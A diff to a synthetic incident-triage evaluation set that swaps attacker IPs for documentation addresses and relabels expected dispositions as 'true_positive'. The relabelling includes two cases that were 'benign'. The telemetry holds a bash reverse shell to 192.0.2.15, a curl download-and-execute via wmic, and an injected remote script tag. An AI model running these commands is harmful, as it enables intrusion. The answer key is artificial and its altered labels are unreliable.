-   "description": "DNS query volume from WIN-DC-SECONDARY 50\u00d7 baseline. TXT records contain base64-encoded payloads. Estimated exfil ~200 MB; destination 185.220.101.7.",
+   "description": "DNS query volume from WIN-DC-SECONDARY 50\u00d7 baseline. TXT records contain base64-encoded payloads. Estimated exfil ~200 MB; destination 198.51.100.7.",
    "severity": "critical",
    "raw_alert": {
     "title": "DNS tunnelling exfiltration from WIN-DC-SECONDARY",
@@ -3772,15 +3772,15 @@
    "telemetry": [
     {
      "source": "dns",
-     "query_name": "aGVsbG8gd29ybGQK.exfil.185.220.101.7.in-addr.arpa",
+     "query_name": "aGVsbG8gd29ybGQK.exfil.198.51.100.7.in-addr.arpa",
      "query_type": "TXT",
      "src_host": "WIN-DC-SECONDARY",
-     "dst_ip": "185.220.101.7",
+     "dst_ip": "198.51.100.7",
      "response_size": 512,
      "qps": 240
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1071.004",
     "T1048.003"
@@ -3824,7 +3824,7 @@
      ]
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1567.002"
    ],
@@ -3858,7 +3858,7 @@
      "file_count": 812
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1567.002",
     "T1005"
@@ -3873,7 +3873,7 @@
    "id": "INC-EVAL-091",
    "provenance": "synthetic",
    "title": "DGA-based C2 traffic from GCP-GKE-NODE-04",
-   "description": "DGA traffic from GCP-GKE-NODE-04 observed; 200+ NXDomain replies/min, IoCs match Volt Typhoon epoch 5. Beacons to 45.142.122.111.",
+   "description": "DGA traffic from GCP-GKE-NODE-04 observed; 200+ NXDomain replies/min, IoCs match Volt Typhoon epoch 5. Beacons to 203.0.113.111.",
    "severity": "high",
    "raw_alert": {
     "title": "DGA-based C2 traffic from GCP-GKE-NODE-04",
@@ -3896,13 +3896,13 @@
      "EventID": 3,
      "Computer": "GCP-GKE-NODE-04",
      "Image": "C:\\Windows\\System32\\svchost.exe",
-     "DestinationIp": "45.142.122.111",
+     "DestinationIp": "203.0.113.111",
      "DestinationPort": 443,
      "Protocol": "tcp",
      "threat_actor": "Volt Typhoon"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1568.002"
    ],
@@ -3916,11 +3916,11 @@
   {
    "id": "INC-EVAL-092",
    "provenance": "synthetic",
-   "title": "HTTPS C2 beacon from LIN-BUILD-CI03 to 91.134.231.15",
-   "description": "Periodic HTTPS beacon from LIN-BUILD-CI03 to 91.134.231.15 every 60 seconds with low jitter. JA3 fingerprint matches Cobalt Strike.",
+   "title": "HTTPS C2 beacon from LIN-BUILD-CI03 to 192.0.2.15",
+   "description": "Periodic HTTPS beacon from LIN-BUILD-CI03 to 192.0.2.15 every 60 seconds with low jitter. JA3 fingerprint matches Cobalt Strike.",
    "severity": "critical",
    "raw_alert": {
-    "title": "HTTPS C2 beacon from LIN-BUILD-CI03 to 91.134.231.15",
+    "title": "HTTPS C2 beacon from LIN-BUILD-CI03 to 192.0.2.15",
     "severity": "critical",
     "template_id": "https-c2-beacon"
    },
@@ -3931,7 +3931,7 @@
      "Provider": "Microsoft-Windows-Sysmon",
      "EventID": 3,
      "Computer": "LIN-BUILD-CI03",
-     "DestinationIp": "91.134.231.15",
+     "DestinationIp": "192.0.2.15",
      "DestinationPort": 443,
      "Protocol": "tcp",
      "ja3": "a0e9f5d64349fb13191bc781f81f42e1",
@@ -3939,7 +3939,7 @@
      "jitter_pct": 2
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1071.001"
    ],
@@ -3991,7 +3991,7 @@
      "threat_actor": "FIN7"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1486"
    ],
@@ -4025,7 +4025,7 @@
      "cpu_pct": 95
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1496"
    ],
@@ -4059,7 +4059,7 @@
      "threat_actor": "APT29"
     }
    ],
-   "expected_disposition": "suspicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1566.001",
     "T1657"
@@ -4074,7 +4074,7 @@
    "id": "INC-EVAL-096",
    "provenance": "synthetic",
    "title": "Public S3 bucket exposing PII",
-   "description": "S3 bucket world-readable; ~40k employee records accessible. CloudTrail shows external enumeration from 91.134.231.15.",
+   "description": "S3 bucket world-readable; ~40k employee records accessible. CloudTrail shows external enumeration from 192.0.2.15.",
    "severity": "critical",
    "raw_alert": {
     "title": "Public S3 bucket exposing PII",
@@ -4108,7 +4108,7 @@
      "eventName": "ListObjectsV2",
      "eventSource": "s3.amazonaws.com",
      "awsRegion": "us-east-1",
-     "sourceIPAddress": "91.134.231.15",
+     "sourceIPAddress": "192.0.2.15",
      "requestParameters": {
       "bucketName": "aisoc-employees",
       "max-keys": 1000
@@ -4118,7 +4118,7 @@
      }
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1530",
     "T1567.002"
@@ -4160,7 +4160,7 @@
      "riskLevelAggregated": "high"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1078.004",
     "T1550.001"
@@ -4194,7 +4194,7 @@
      "duration_secs": 720
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1498.001"
    ],
@@ -4229,7 +4229,7 @@
      "Bytes": 8300000000
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1114.002",
     "T1567.002"
@@ -4274,7 +4274,7 @@
      "DestinationPort": 443
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1137.006",
     "T1071.001"
@@ -4284,11 +4284,11 @@
   {
    "id": "INC-EVAL-101",
    "provenance": "synthetic",
-   "title": "GitHub PAT leaked and abused from 45.142.122.111",
-   "description": "Personal access token belonging to admin@example.com used from 45.142.122.111 to clone 14 private repos. Token committed in public dotfiles repo 6 hours earlier.",
+   "title": "GitHub PAT leaked and abused from 203.0.113.111",
+   "description": "Personal access token belonging to admin@example.com used from 203.0.113.111 to clone 14 private repos. Token committed in public dotfiles repo 6 hours earlier.",
    "severity": "critical",
    "raw_alert": {
-    "title": "GitHub PAT leaked and abused from 45.142.122.111",
+    "title": "GitHub PAT leaked and abused from 203.0.113.111",
     "severity": "critical",
     "template_id": "github-pat-leak"
    },
@@ -4297,7 +4297,7 @@
      "source": "github_audit",
      "action": "git.clone",
      "actor": "admin@example.com",
-     "actor_ip": "45.142.122.111",
+     "actor_ip": "203.0.113.111",
      "repo_count": 14,
      "programmatic_access_type": "personal_access_token",
      "user_agent": "git/2.40.0"
@@ -4312,7 +4312,7 @@
      "secret_detected": "github_pat_*"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1552.001",
     "T1213.003"
@@ -4357,7 +4357,7 @@
      "userAgent": "aws-cli/2.13"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1552.005",
     "T1078.004"
@@ -4368,7 +4368,7 @@
    "id": "INC-EVAL-103",
    "provenance": "synthetic",
    "title": "Vendor admin password reset abuse for heidi@example.com",
-   "description": "Password reset for heidi@example.com performed by helpdesk in response to social-engineering call from 185.220.101.7. Token claimed within 90 seconds.",
+   "description": "Password reset for heidi@example.com performed by helpdesk in response to social-engineering call from 198.51.100.7. Token claimed within 90 seconds.",
    "severity": "high",
    "raw_alert": {
     "title": "Vendor admin password reset abuse for heidi@example.com",
@@ -4388,12 +4388,12 @@
      "source": "azure_signin",
      "category": "SignInLogs",
      "userPrincipalName": "heidi@example.com",
-     "ipAddress": "185.220.101.7",
+     "ipAddress": "198.51.100.7",
      "resultType": 0,
      "seconds_after_reset": 87
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1566.004",
     "T1078"
@@ -4408,7 +4408,7 @@
    "id": "INC-EVAL-104",
    "provenance": "synthetic",
    "title": "OAuth refresh-token theft for alice@example.com",
-   "description": "Refresh token for alice@example.com replayed from 91.134.231.15. Granted access to mailbox + OneDrive without re-prompt.",
+   "description": "Refresh token for alice@example.com replayed from 192.0.2.15. Granted access to mailbox + OneDrive without re-prompt.",
    "severity": "high",
    "raw_alert": {
     "title": "OAuth refresh-token theft for alice@example.com",
@@ -4420,14 +4420,14 @@
      "source": "azure_signin",
      "category": "SignInLogs",
      "userPrincipalName": "alice@example.com",
-     "ipAddress": "91.134.231.15",
+     "ipAddress": "192.0.2.15",
      "resultType": 0,
      "authenticationProtocol": "oAuth2",
      "grantType": "refresh_token",
      "resourceDisplayName": "Microsoft Graph"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1550.001"
    ],
@@ -4480,7 +4480,7 @@
      "cve_layer_count": 2
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1195.002",
     "T1610"
@@ -4513,7 +4513,7 @@
      "threat_actor": "MosaicRegressor"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1564.008",
     "T1114.003"
@@ -4548,7 +4548,7 @@
      "user": "ceo@example.com"
     }
    ],
-   "expected_disposition": "suspicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1070.002"
    ],
@@ -4592,7 +4592,7 @@
      "secret_detected": true
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1195.002",
     "T1552.004"
@@ -4631,7 +4631,7 @@
      "EventCount": 128
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1078.004",
     "T1021.002"
@@ -4666,7 +4666,7 @@
      "LogonType": 5
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1078.001",
     "T1070.001"
@@ -4720,7 +4720,7 @@
      "threat_actor": "Scattered Spider"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1566.001",
     "T1059.005"
@@ -4764,7 +4764,7 @@
      "rule_match": "WAF:SSRF:2007"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1190",
     "T1082"
@@ -4778,11 +4778,11 @@
   {
    "id": "INC-EVAL-113",
    "provenance": "synthetic",
-   "title": "Watering-hole exploit served from internal Confluence by 185.220.101.7",
-   "description": "Internal Confluence page injected with malicious JavaScript by 185.220.101.7. Drive-by exploit triggered browser exploitation on multiple visitors including admin@example.com. Linked to MagicWeb TTPs.",
+   "title": "Watering-hole exploit served from internal Confluence by 198.51.100.7",
+   "description": "Internal Confluence page injected with malicious JavaScript by 198.51.100.7. Drive-by exploit triggered browser exploitation on multiple visitors including admin@example.com. Linked to MagicWeb TTPs.",
    "severity": "high",
    "raw_alert": {
-    "title": "Watering-hole exploit served from internal Confluence by 185.220.101.7",
+    "title": "Watering-hole exploit served from internal Confluence by 198.51.100.7",
     "severity": "high",
     "template_id": "confluence-watering-hole"
    },
@@ -4792,9 +4792,9 @@
      "http_method": "POST",
      "url": "https://confluence.example.com/pages/editpage.action?pageId=8472",
      "status_code": 200,
-     "src_ip": "185.220.101.7",
+     "src_ip": "198.51.100.7",
      "user_agent": "Mozilla/5.0",
-     "payload_excerpt": "<script src=//185.220.101.7/x.js></script>"
+     "payload_excerpt": "<script src=//198.51.100.7/x.js></script>"
     },
     {
      "source": "edr",
@@ -4805,7 +4805,7 @@
      "threat_actor": "MagicWeb"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1189",
     "T1203"
@@ -4858,7 +4858,7 @@
      "dest_port": 4444
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1195.001",
     "T1059.007"
@@ -4899,7 +4899,7 @@
      "CommandLine": "python.exe E:\\autorun.py --stage C:\\Temp\\"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1091",
     "T1005"
@@ -4914,7 +4914,7 @@
    "id": "INC-EVAL-116",
    "provenance": "synthetic",
    "title": "OAuth consent phishing targeting eve@example.com",
-   "description": "Malicious OAuth application granted Mail.Read and Files.Read.All scopes by eve@example.com. Inbox forwarding rule created sending mail to 91.134.231.15.",
+   "description": "Malicious OAuth application granted Mail.Read and Files.Read.All scopes by eve@example.com. Inbox forwarding rule created sending mail to 192.0.2.15.",
    "severity": "high",
    "raw_alert": {
     "title": "OAuth consent phishing targeting eve@example.com",
@@ -4941,12 +4941,12 @@
      "UserId": "eve@example.com",
      "Parameters": {
       "Name": "Auto-fwd",
-      "ForwardTo": "ext@91.134.231.15",
+      "ForwardTo": "ext@192.0.2.15",
       "DeleteMessage": true
      }
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1528",
     "T1550.001"
@@ -4991,7 +4991,7 @@
      "threat_actor": "MosaicRegressor"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1059.001",
     "T1027"
@@ -5036,7 +5036,7 @@
      "Protocol": "tcp"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1105",
     "T1218.009"
@@ -5051,7 +5051,7 @@
    "id": "INC-EVAL-119",
    "provenance": "synthetic",
    "title": "Container runtime abuse: malicious `docker run` on WIN-FILE-SHARE",
-   "description": "Unauthenticated Docker API on WIN-FILE-SHARE exploited from 185.220.101.7. Container with cryptominer spawned. CPU on host saturated to 95%.",
+   "description": "Unauthenticated Docker API on WIN-FILE-SHARE exploited from 198.51.100.7. Container with cryptominer spawned. CPU on host saturated to 95%.",
    "severity": "high",
    "raw_alert": {
     "title": "Container runtime abuse: malicious `docker run` on WIN-FILE-SHARE",
@@ -5064,7 +5064,7 @@
      "http_method": "POST",
      "url": "http://WIN-FILE-SHARE:2375/containers/create",
      "status_code": 201,
-     "src_ip": "185.220.101.7",
+     "src_ip": "198.51.100.7",
      "request_body": {
       "Image": "monero/xmrig",
       "HostConfig": {
@@ -5084,7 +5084,7 @@
      "user": "root"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1610",
     "T1059.004",
@@ -5131,7 +5131,7 @@
      "Destination": "powershell.exe -enc <encoded>"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1546.003",
     "T1059.001"
@@ -5174,7 +5174,7 @@
      "threat_actor": "ALPHV/BlackCat"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1547.001"
    ],
@@ -5214,7 +5214,7 @@
      "User": "carol@example.com"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1053.005"
    ],
@@ -5249,7 +5249,7 @@
      "indicator_path": "ESP:/EFI/Boot/bootx64.efi"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1542.001",
     "T1027.002"
@@ -5264,7 +5264,7 @@
    "id": "INC-EVAL-124",
    "provenance": "synthetic",
    "title": "Backdoor cron job installed on MAC-LEGAL-LAPTOP",
-   "description": "/etc/cron.d entry created by alice@example.com on MAC-LEGAL-LAPTOP. Reverse shell beacon to 91.134.231.15 every 5 minutes.",
+   "description": "/etc/cron.d entry created by alice@example.com on MAC-LEGAL-LAPTOP. Reverse shell beacon to 192.0.2.15 every 5 minutes.",
    "severity": "high",
    "raw_alert": {
     "title": "Backdoor cron job installed on MAC-LEGAL-LAPTOP",
@@ -5285,11 +5285,11 @@
     {
      "source": "linux_journald",
      "_SYSTEMD_UNIT": "cron.service",
-     "MESSAGE": "(root) CMD (/bin/bash -i >& /dev/tcp/91.134.231.15/4444 0>&1)",
+     "MESSAGE": "(root) CMD (/bin/bash -i >& /dev/tcp/192.0.2.15/4444 0>&1)",
      "hostname": "MAC-LEGAL-LAPTOP"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1053.003",
     "T1071.001"
@@ -5331,7 +5331,7 @@
      "User": "SYSTEM"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1548.002"
    ],
@@ -5394,7 +5394,7 @@
      "user": "root"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1611",
     "T1082"
@@ -5438,7 +5438,7 @@
      "user": "frank@example.com"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1548.001"
    ],
@@ -5452,7 +5452,7 @@
    "id": "INC-EVAL-128",
    "provenance": "synthetic",
    "title": "Memory-only fileless implant in svchost on GCP-GKE-NODE-04",
-   "description": "Process hollowing detected on GCP-GKE-NODE-04: svchost.exe replaced with Cobalt Strike beacon to 91.134.231.15. No disk artefacts. Linked to ALPHV/BlackCat.",
+   "description": "Process hollowing detected on GCP-GKE-NODE-04: svchost.exe replaced with Cobalt Strike beacon to 192.0.2.15. No disk artefacts. Linked to ALPHV/BlackCat.",
    "severity": "critical",
    "raw_alert": {
     "title": "Memory-only fileless implant in svchost on GCP-GKE-NODE-04",
@@ -5478,7 +5478,7 @@
      "EventID": 3,
      "Computer": "GCP-GKE-NODE-04",
      "Image": "C:\\Windows\\System32\\svchost.exe",
-     "DestinationIp": "91.134.231.15",
+     "DestinationIp": "192.0.2.15",
      "DestinationPort": 443,
      "Protocol": "tcp",
      "ja3": "a0e9f5d64349fb13191bc781f81f42e1"
@@ -5491,7 +5491,7 @@
      "threat_actor": "ALPHV/BlackCat"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1055.012",
     "T1620"
@@ -5535,7 +5535,7 @@
      "CommandLine": "wevtutil cl Security"
     }
    ],
-   "expected_disposition": "suspicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1070.001"
    ],
@@ -5585,7 +5585,7 @@
      "User": "grace@example.com"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1562.001"
    ],
@@ -5630,7 +5630,7 @@
      "User": "grace@example.com"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1003.001"
    ],
@@ -5643,11 +5643,11 @@
   {
    "id": "INC-EVAL-132",
    "provenance": "synthetic",
-   "title": "Brute-force credential spray against cfo@example.com from 91.134.231.15",
-   "description": "Credential spray from 91.134.231.15 against cfo@example.com. 1500 password attempts in 30 minutes. One success followed by anomalous Azure AD sign-in.",
+   "title": "Brute-force credential spray against cfo@example.com from 192.0.2.15",
+   "description": "Credential spray from 192.0.2.15 against cfo@example.com. 1500 password attempts in 30 minutes. One success followed by anomalous Azure AD sign-in.",
    "severity": "high",
    "raw_alert": {
-    "title": "Brute-force credential spray against cfo@example.com from 91.134.231.15",
+    "title": "Brute-force credential spray against cfo@example.com from 192.0.2.15",
     "severity": "high",
     "template_id": "credential-spray"
    },
@@ -5656,7 +5656,7 @@
      "source": "azure_signin",
      "category": "SignInLogs",
      "userPrincipalName": "cfo@example.com",
-     "ipAddress": "91.134.231.15",
+     "ipAddress": "192.0.2.15",
      "resultType": 50126,
      "resultDescription": "Invalid username or password",
      "appDisplayName": "Office 365 Exchange Online",
@@ -5666,14 +5666,14 @@
      "source": "azure_signin",
      "category": "SignInLogs",
      "userPrincipalName": "cfo@example.com",
-     "ipAddress": "91.134.231.15",
+     "ipAddress": "192.0.2.15",
      "resultType": 0,
      "resultDescription": "Success",
      "conditionalAccessStatus": "success",
      "riskLevelAggregated": "high"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1110.003"
    ],
@@ -5718,7 +5718,7 @@
      "IpAddress": "WIN-EXCHANGE-01"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1558.003",
     "T1021.001"
@@ -5754,7 +5754,7 @@
      "ClientIP": "WIN-FIN-DB01"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1003.006",
     "T1078.002"
@@ -5769,7 +5769,7 @@
    "id": "INC-EVAL-135",
    "provenance": "synthetic",
    "title": "SAML golden-ticket: forged assertion targeting svc-deploy@example.com",
-   "description": "Forged SAML assertion detected for svc-deploy@example.com. Attacker pivoted to Azure AD; account enumeration followed from 45.142.122.111.",
+   "description": "Forged SAML assertion detected for svc-deploy@example.com. Attacker pivoted to Azure AD; account enumeration followed from 203.0.113.111.",
    "severity": "critical",
    "raw_alert": {
     "title": "SAML golden-ticket: forged assertion targeting svc-deploy@example.com",
@@ -5781,7 +5781,7 @@
      "source": "azure_signin",
      "category": "SignInLogs",
      "userPrincipalName": "svc-deploy@example.com",
-     "ipAddress": "45.142.122.111",
+     "ipAddress": "203.0.113.111",
      "resultType": 0,
      "authenticationDetails": [
       {
@@ -5805,7 +5805,7 @@
      ]
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1606.002",
     "T1087.002"
@@ -5851,7 +5851,7 @@
      "EventCount": 8400
     }
    ],
-   "expected_disposition": "benign",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1087.002"
    ],
@@ -5895,7 +5895,7 @@
      "EventCount": 256
     }
    ],
-   "expected_disposition": "benign",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1135"
    ],
@@ -5939,7 +5939,7 @@
      "threat_actor": "MagicWeb"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1550.002",
     "T1558.001"
@@ -5975,7 +5975,7 @@
      "EventTimeUTC": "03:14:00Z"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1021.001"
    ],
@@ -5989,7 +5989,7 @@
    "id": "INC-EVAL-140",
    "provenance": "synthetic",
    "title": "WMI lateral execution from MAC-CFO-LAPTOP to MAC-LEGAL-LAPTOP",
-   "description": "wmic.exe /node:MAC-LEGAL-LAPTOP process call create observed from MAC-CFO-LAPTOP by ceo@example.com. Remote command execution; payload from 91.134.231.15.",
+   "description": "wmic.exe /node:MAC-LEGAL-LAPTOP process call create observed from MAC-CFO-LAPTOP by ceo@example.com. Remote command execution; payload from 192.0.2.15.",
    "severity": "high",
    "raw_alert": {
     "title": "WMI lateral execution from MAC-CFO-LAPTOP to MAC-LEGAL-LAPTOP",
@@ -6005,10 +6005,10 @@
      "Computer": "MAC-CFO-LAPTOP",
      "User": "ceo@example.com",
      "Image": "C:\\Windows\\System32\\wbem\\wmic.exe",
-     "CommandLine": "wmic /node:MAC-LEGAL-LAPTOP process call create \"cmd /c curl http://91.134.231.15/p.exe -o C:\\Users\\Public\\p.exe && C:\\Users\\Public\\p.exe\""
+     "CommandLine": "wmic /node:MAC-LEGAL-LAPTOP process call create \"cmd /c curl http://192.0.2.15/p.exe -o C:\\Users\\Public\\p.exe && C:\\Users\\Public\\p.exe\""
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1047"
    ],
@@ -6041,7 +6041,7 @@
      "bytes": 10700000000
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1005",
     "T1041"
@@ -6085,7 +6085,7 @@
      "User": "svc-deploy@example.com"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1115"
    ],
@@ -6117,7 +6117,7 @@
      "qps": 240
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1071.004",
     "T1048.003"
@@ -6132,7 +6132,7 @@
    "id": "INC-EVAL-144",
    "provenance": "synthetic",
    "title": "Cloud storage exfil: data egress to attacker-controlled S3 from WIN-PROD-WEB02",
-   "description": "Egress from WIN-PROD-WEB02 to s3://atk-stage-185.220.101.7/dump/ by ops-lead@example.com. 8 GB transferred over 20 minutes. CloudTrail PutObject events match.",
+   "description": "Egress from WIN-PROD-WEB02 to s3://atk-stage-198.51.100.7/dump/ by ops-lead@example.com. 8 GB transferred over 20 minutes. CloudTrail PutObject events match.",
    "severity": "critical",
    "raw_alert": {
     "title": "Cloud storage exfil: data egress to attacker-controlled S3 from WIN-PROD-WEB02",
@@ -6151,17 +6151,17 @@
      },
      "sourceIPAddress": "WIN-PROD-WEB02",
      "requestParameters": {
-      "bucketName": "atk-stage-185.220.101.7",
+      "bucketName": "atk-stage-198.51.100.7",
       "key": "dump/customers.tar.gz"
      },
      "resources": [
       {
-       "ARN": "arn:aws:s3:::atk-stage-185.220.101.7/dump/customers.tar.gz"
+       "ARN": "arn:aws:s3:::atk-stage-198.51.100.7/dump/customers.tar.gz"
       }
      ]
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1567.002"
    ],
@@ -6195,7 +6195,7 @@
      "file_count": 812
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1567.002",
     "T1005"
@@ -6210,7 +6210,7 @@
    "id": "INC-EVAL-146",
    "provenance": "synthetic",
    "title": "DGA-based C2 traffic from GCP-GKE-NODE-04",
-   "description": "DGA traffic from GCP-GKE-NODE-04 observed; 200+ NXDomain replies/min, IoCs match Scattered Spider epoch 5. Beacons to 45.142.122.111.",
+   "description": "DGA traffic from GCP-GKE-NODE-04 observed; 200+ NXDomain replies/min, IoCs match Scattered Spider epoch 5. Beacons to 203.0.113.111.",
    "severity": "high",
    "raw_alert": {
     "title": "DGA-based C2 traffic from GCP-GKE-NODE-04",
@@ -6233,13 +6233,13 @@
      "EventID": 3,
      "Computer": "GCP-GKE-NODE-04",
      "Image": "C:\\Windows\\System32\\svchost.exe",
-     "DestinationIp": "45.142.122.111",
+     "DestinationIp": "203.0.113.111",
      "DestinationPort": 443,
      "Protocol": "tcp",
      "threat_actor": "Scattered Spider"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1568.002"
    ],
@@ -6276,7 +6276,7 @@
      "jitter_pct": 2
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1071.001"
    ],
@@ -6328,7 +6328,7 @@
      "threat_actor": "Emotet epoch 5"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1486"
    ],
@@ -6362,7 +6362,7 @@
      "cpu_pct": 95
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1496"
    ],
@@ -6396,7 +6396,7 @@
      "threat_actor": "APT29"
     }
    ],
-   "expected_disposition": "suspicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1566.001",
     "T1657"
@@ -6411,7 +6411,7 @@
    "id": "INC-EVAL-151",
    "provenance": "synthetic",
    "title": "Public S3 bucket exposing PII",
-   "description": "S3 bucket world-readable; ~40k employee records accessible. CloudTrail shows external enumeration from 91.134.231.15.",
+   "description": "S3 bucket world-readable; ~40k employee records accessible. CloudTrail shows external enumeration from 192.0.2.15.",
    "severity": "critical",
    "raw_alert": {
     "title": "Public S3 bucket exposing PII",
@@ -6445,7 +6445,7 @@
      "eventName": "ListObjectsV2",
      "eventSource": "s3.amazonaws.com",
      "awsRegion": "us-east-1",
-     "sourceIPAddress": "91.134.231.15",
+     "sourceIPAddress": "192.0.2.15",
      "requestParameters": {
       "bucketName": "aisoc-employees",
       "max-keys": 1000
@@ -6455,7 +6455,7 @@
      }
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1530",
     "T1567.002"
@@ -6466,7 +6466,7 @@
    "id": "INC-EVAL-152",
    "provenance": "synthetic",
    "title": "Identity provider compromise \u2014 anomalous Azure AD sign-in for carol@example.com",
-   "description": "Successful Azure AD sign-in for carol@example.com from 91.134.231.15 (impossible-travel from prior location). MFA satisfied via stolen session token.",
+   "description": "Successful Azure AD sign-in for carol@example.com from 192.0.2.15 (impossible-travel from prior location). MFA satisfied via stolen session token.",
    "severity": "critical",
    "raw_alert": {
     "title": "Identity provider compromise \u2014 anomalous Azure AD sign-in for carol@example.com",
@@ -6478,7 +6478,7 @@
      "source": "azure_signin",
      "category": "SignInLogs",
      "userPrincipalName": "carol@example.com",
-     "ipAddress": "91.134.231.15",
+     "ipAddress": "192.0.2.15",
      "location": {
       "city": "Vladivostok",
       "countryOrRegion": "RU"
@@ -6497,7 +6497,7 @@
      "riskLevelAggregated": "high"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1078.004",
     "T1550.001"
@@ -6531,7 +6531,7 @@
